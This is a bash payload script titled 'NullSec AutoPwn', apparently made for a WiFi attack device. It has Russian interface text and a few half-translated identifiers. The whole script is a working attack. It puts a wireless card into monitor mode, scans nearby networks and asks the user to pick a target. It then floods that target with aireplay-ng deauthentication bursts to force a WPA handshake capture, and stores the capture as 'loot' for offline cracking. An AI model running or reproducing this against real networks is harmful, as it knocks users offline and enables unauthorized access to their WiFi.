#!/bin/bash
. /root/payloads/library/nullsec-iface.sh 2>/dev/null || . "$(dirname "$0")/../../../lib/nullsec-iface.sh"
# Title: NullSec AutoPwn
# Author: bad-antics
# Description: Automated WiFi attack - scans, selects targets, captures
# Category: nullsec

# FIX: UI PATH and fallbacks
export PATH=/usr/sbin:/sbin:/bin:/mmc/usr/sbin:/mmc/usr/bin:$PATH
command -v PROMPT >/dev/null 2>&1 || PROMPT() { echo "$1"; read -p "Press Enter: "; }
command -v ERROR_DIALOG >/dev/null 2>&1 || ERROR_DIALOG() { echo "ERROR: $1" >&2; exit 1; }
command -v LOG >/dev/null 2>&1 || LOG() { echo "[LOG] $1"; }
command -v SPINNER_START >/dev/null 2>&1 || SPINNER_START() { echo "[*] $1"; }
command -v SPINNER_STOP >/dev/null 2>&1 || SPINNER_STOP() { echo "[✓] Done"; }
command -v ALERT >/dev/null 2>&1 || ALERT() { echo "[ALERT] $1"; }
command -v NUMBER_PICKER >/dev/null 2>&1 || NUMBER_PICKER() { echo "$1"; read -p "Choice: " choice; echo "${choice:-$2}"; }
command -v CONFIRMATION_DIALOG >/dev/null 2>&1 || CONFIRMATION_DIALOG() { echo "$1"; read -p "Confirm (y/n): " confirm; [ "$confirm" = "y" ] && echo "0" || echo "1"; }

LOOT_DIR="/mmc/nullsec"
LOG_FILE="$LOOT_DIR/logs/autopwn_$(date +%Y%m%d_%H%M%S).log"

mkdir -p "$LOOT_DIR"/{handshakes,creds,probes,pmkid,logs}

# Logging function
log() { echo "[$(date '+%H:%M:%S')] $1" >> "$LOG_FILE"; LOG "$1"; }

# --- INTRODUCTION ---
PROMPT "NULLSEC AUTO-PWN

Автоматизированная WiFi-атака:
- Сканирование сетей
- Выбор цели
- Перехват рукопожатия
- Сбор PMKID

Нажмите OK для начала сканирования."

# --- DETECT INTERFACES ---
MONITOR_IF=""
for iface in wlan1mon wlan2mon mon0; do
    if [ -d "/sys/class/net/$iface" ]; then
        MONITOR_IF="$iface"
        break
    fi
done

if [ -z "$MONITOR_IF" ]; then
    # Try to create monitor mode
    for iface in wlan1 wlan2; do
        if [ -d "/sys/class/net/$iface" ]; then
            # FIX: Use iw instead of airmon-ng if not available
            if command -v airmon-ng >/dev/null 2>&1; then
                airmon-ng start $iface 2>/dev/null
                MONITOR_IF="${iface}mon"
            else
                iw dev $iface interface add ${iface}mon type monitor 2>/dev/null
                ifconfig ${iface}mon up 2>/dev/null
                MONITOR_IF="${iface}mon"
            fi
            [ -d "/sys/class/net/$MONITOR_IF" ] && break
        fi
    done
fi

if [ -z "$MONITOR_IF" ] || [ ! -d "/sys/class/net/$MONITOR_IF" ]; then
    ERROR_DIALOG "Мониторный интерфейс не найден!

Включите режим мониторинга одной из команд:
iw dev wlan0 interface add mon0 type monitor
ifconfig mon0 up"
    exit 1
fi

log "Using interface: $MONITOR_IF"

# --- SCAN FOR СЕТЬS ---
LOG "Сканирование сетей..."
SPINNER_START "Scanning WiFi networks..."

rm -f /tmp/autopwn_scan*
timeout 20 airodump-ng "$MONITOR_IF" -w /tmp/autopwn_scan --output-format csv 2>/dev/null &
SCAN_PID=$!
sleep 20
kill $SCAN_PID 2>/dev/null
killall airodump-ng 2>/dev/null

SPINNER_STOP

# Parse networks into arrays
declare -a BSSIDS CHANNELS ESSIDS POWERS
idx=0

if [ -f /tmp/autopwn_scan-01.csv ]; then
    while IFS=',' read -r bssid first last channel speed priv cipher auth power beacons iv lan id essid rest; do
        bssid=$(echo "$bssid" | tr -d ' ')
        [[ ! "$bssid" =~ ^[0-9A-Fa-f]{2}: ]] && continue
        
        essid=$(echo "$essid" | tr -d ' ' | head -c 20)
        [ -z "$essid" ] && essid="[Hidden]"
        channel=$(echo "$channel" | tr -d ' ')
        power=$(echo "$power" | tr -d ' ')
        
        BSSIDS[$idx]="$bssid"
        CHANNELS[$idx]="$channel"
        ESSIDS[$idx]="$essid"
        POWERS[$idx]="$power"
        
        idx=$((idx + 1))
        [ $idx -ge 15 ] && break
    done < /tmp/autopwn_scan-01.csv
fi

if [ $idx -eq 0 ]; then
    ERROR_DIALOG "Сети не найдены!

Попробуйте переместиться в другое место
или проверьте интерфейс мониторинга."
    exit 1
fi

# --- SELECT TARGET ---
СЕТЬ_LIST="Найдено $idx networks:

"
for i in $(seq 0 $((idx-1))); do
    СЕТЬ_LIST="${СЕТЬ_LIST}$((i+1)). ${ESSIDS[$i]} (${POWERS[$i]}dBm)
"
done

TARGET_NUM=$(NUMBER_PICKER "Выберите цель (1-$idx):" 1)

# Validate selection
TARGET_NUM=$((TARGET_NUM - 1))
[ $TARGET_NUM -lt 0 ] && TARGET_NUM=0
[ $TARGET_NUM -ge $idx ] && TARGET_NUM=$((idx - 1))

TARGET_BSSID="${BSSIDS[$TARGET_NUM]}"
TARGET_CHANNEL="${CHANNELS[$TARGET_NUM]}"
TARGET_ESSID="${ESSIDS[$TARGET_NUM]}"

log "Выбранная цель: $TARGET_ESSID ($TARGET_BSSID) CH:$TARGET_CHANNEL"

# --- SELECT DURATION ---
DURATION=$(NUMBER_PICKER "Длительность захвата (сек):" 60)
[ $DURATION -lt 10 ] && DURATION=10
[ $DURATION -gt 300 ] && DURATION=300

# --- CONFIRM ATTACK ---
PROMPT "Атаковать $TARGET_ESSID?

BSSID: $TARGET_BSSID
Канал: $TARGET_CHANNEL
Длительность: ${DURATION}s

Нажмите OK для атаки."

# --- EXECUTE ATTACK ---
LOG "Starting attack on $TARGET_ESSID"

CAPTURE_FILE="$LOOT_DIR/handshakes/${TARGET_ESSID}_$(date +%Y%m%d_%H%M%S)"

# Set channel
iw dev "$MONITOR_IF" set channel "$TARGET_CHANNEL" 2>/dev/null

# Start capture
airodump-ng "$MONITOR_IF" --bssid "$TARGET_BSSID" -c "$TARGET_CHANNEL" \
    -w "$CAPTURE_FILE" --output-format pcap 2>/dev/null &
CAPTURE_PID=$!

sleep 3

# Deauth bursts
LOG "Sending deauth packets..."
DEAUTH_COUNT=0
START=$(date +%s)
HS_FOUND="Нет"

while [ $(($(date +%s) - START)) -lt $DURATION ]; do
    aireplay-ng -0 5 -a "$TARGET_BSSID" "$MONITOR_IF" 2>/dev/null
    DEAUTH_COUNT=$((DEAUTH_COUNT + 5))
    sleep 5
    
    # Check for handshake
    if [ -f "${CAPTURE_FILE}-01.cap" ]; then
        if aircrack-ng "${CAPTURE_FILE}-01.cap" 2>/dev/null | grep -q "1 handshake"; then
            HS_FOUND="Да"
            LOG "РУКОПОЖАТИЕ ЗАХВАЧЕНО!"
            ALERT "Рукопожатие захвачено для $TARGET_ESSID!"
            break
        fi
    fi
done

# Cleanup
kill $CAPTURE_PID 2>/dev/null
killall airodump-ng aireplay-ng 2>/dev/null

PROMPT "АТАКА ЗАВЕРШЕНА

Цель: $TARGET_ESSID
Отправлено деаутх-пакетов: $DEAUTH_COUNT
Рукопожатие: $HS_FOUND

Захват сохранён:
$CAPTURE_FILE

Нажмите OK для выхода."

log "Атака завершена. Рукопожатие: $HS_FOUND"
exit 0
